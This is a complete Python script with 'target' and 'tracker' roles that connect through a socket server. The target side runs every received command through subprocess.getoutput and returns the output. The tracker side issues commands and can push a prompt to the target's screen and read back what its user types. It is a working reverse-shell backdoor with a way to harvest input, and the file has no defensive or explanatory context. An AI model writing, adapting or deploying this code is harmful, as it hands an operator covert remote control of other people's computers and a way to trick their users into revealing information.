import socket
import subprocess

class Target:
    def __init__(self, host, port):
        self.s = socket.socket()
        self.host = host
        self.port = port

    def connect(self):
        self.s.connect((self.host, self.port))
        self.s.send('target'.encode())
        print("Target connected to Server.")

    def run(self):
        while True:
            command = self.s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            if command.lower() == 'input':
                prompt = self.s.recv(1024).decode()
                user_input = input(prompt)
                self.s.send(user_input.encode())
            else:
                output = subprocess.getoutput(command)
                self.s.send(output.encode())
        self.s.close()

class Tracker:
    def __init__(self, host, port):
        self.s = socket.socket()
        self.host = host
        self.port = port

    def connect(self):
        self.s.connect((self.host, self.port))
        self.s.send('tracker'.encode())
        print("Tracker connected to Server.")

    def run(self):
        while True:
            command = input("Enter Command: ")
            if command.lower() == 'exit':
                self.s.send('exit'.encode())
                break
            self.s.send(command.encode())
            if command.lower() == 'input':
                prompt = input("Enter prompt for target: ")
                self.s.send(prompt.encode())
                user_input = self.s.recv(1024).decode()
                print(f"Target input: {user_input}")
            else:
                output = self.s.recv(1024).decode()
                print(output)
        self.s.close()

def main():
    host = "127.0.0.1"
    port = 8080

    role = input("Enter role (target/tracker): ").strip().lower()
    if role == 'target':
        target = Target(host, port)
        target.connect()
        target.run()
    elif role == 'tracker':
        tracker = Tracker(host, port)
        tracker.connect()
        tracker.run()
    else:
        print("Invalid role. Please enter 'target' or 'tracker'.")

if __name__ == "__main__":
    main()